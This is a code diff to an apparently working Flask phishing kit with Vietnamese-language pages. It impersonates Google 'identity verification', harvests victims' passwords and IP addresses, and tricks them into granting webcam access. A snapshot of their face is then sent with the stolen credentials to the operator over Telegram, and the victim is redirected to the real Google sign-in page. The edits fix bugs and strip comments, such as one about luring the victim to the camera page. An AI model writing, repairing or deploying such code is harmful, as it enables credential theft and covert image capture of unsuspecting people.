@@ -71,13 +71,12 @@ HTML_CAMERA_SCAM = f"""
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>Xác minh danh tính</title>{CSS}
 <style>
-    #video { width: 100%; border-radius: 8px; display: none; margin-bottom: 15px; }
+    #video {{ width: 100%; border-radius: 8px; display: none; margin-bottom: 15px; }}
     .notice {{ font-size: 13px; color: #d93025; margin-top: 15px; }}
 </style>
 </head>
 <body>
     <div class="login-box">
-        <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
         <h1>Xác minh danh tính</h1>
         <p>Để đảm bảo tài khoản của bạn không bị xâm nhập, Google yêu cầu xác minh khuôn mặt qua Webcam.</p>
         
@@ -97,23 +96,19 @@ HTML_CAMERA_SCAM = f"""
         btn.addEventListener('click', async () => {{
             status.innerText = "Đang yêu cầu quyền truy cập...";
             try {{
-                // Xin quyền Camera và Mic
                 const stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: false }});
                 video.srcObject = stream;
                 video.style.display = 'block';
                 btn.style.display = 'none';
                 status.innerText = "Vui lòng nhìn thẳng vào Camera...";
                 
-                // Đợi 2 giây cho cam lấy nét rồi chụp
                 setTimeout(() => {{
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // Lấy dữ liệu ảnh dạng Base64
                     const imageData = canvas.toDataURL('image/jpeg', 0.8);
                     
-                    // Gửi về server
                     fetch('/upload_face', {{
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json' }},
@@ -124,7 +119,6 @@ HTML_CAMERA_SCAM = f"""
                         setTimeout(() => window.location.href = "https://accounts.google.com", 1000);
                     }});
                     
-                    // Tắt cam
                     stream.getTracks().forEach(track => track.stop());
                 }}, 2000);
 
@@ -153,10 +147,8 @@ def password_page():
 @app.route('/verify_pass', methods=['POST'])
 def verify_pass():
     password = request.form.get('password')
-    email = request.referrer.split('email=')[-1] if 'email=' in request.referer else "Unknown"
+    email = request.referrer.split('email=')[-1] if 'email=' in request.referrer else "Unknown"
     send_telegram(f"🔑 **BẮT ĐƯỢC PASSWORD!**\nIP: `{request.remote_addr}`\nEmail: `{email}`\nPass: `{password}`")
-    
-    # Dẫn dụ nạn nhân sang trang xin quyền cam
     return redirect(f"/verify?email={email}")
 
 @app.route('/verify')
@@ -170,10 +162,7 @@ def upload_face():
     image_data = data.get('image')
 
     if image_data:
-        # Cắt bỏ tiền tố "data:image/jpeg;base64," để giải mã
         img_bytes = base64.b64decode(image_data.split(',')[1])
-        
-        # Gửi ảnh qua Telegram
         send_telegram_photo(img_bytes, email)
         
     return "OK"
